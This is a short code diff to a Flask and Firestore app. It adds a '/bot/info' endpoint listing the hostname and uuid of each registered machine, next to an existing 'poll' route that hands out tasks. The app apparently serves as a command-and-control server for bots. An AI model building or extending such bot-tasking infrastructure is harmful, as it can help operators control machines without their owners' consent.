@@ -1,4 +1,4 @@
-from flask import request, Blueprint
+from flask import jsonify, request, Blueprint
 
 import firebase_admin
 from firebase_admin import credentials, firestore
@@ -63,3 +63,18 @@ def poll():
         return {'task': task}
 
     return ({'task': None}, 418)
+
+
+@routes.route('/bot/info', methods=['GET'])
+def info():
+    machines = db.collection('machines').get()
+
+    res = []
+
+    for x in machines:
+        print(x.to_dict())
+        tmp = {}
+        tmp['hostname'] = x.to_dict()['hostname']
+        tmp['uuid']=x.to_dict()['uuid']
+        res.append(tmp)
+    return jsonify(res)
